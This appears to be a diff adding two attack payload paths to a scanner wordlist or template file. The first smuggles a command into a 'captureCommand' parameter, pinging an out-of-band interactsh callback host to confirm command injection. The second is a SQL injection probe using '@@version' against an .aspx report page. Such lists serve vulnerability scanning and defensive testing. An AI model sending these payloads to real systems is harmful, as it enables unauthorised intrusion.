@@ -1,0 +1,2 @@
+/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
+/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+
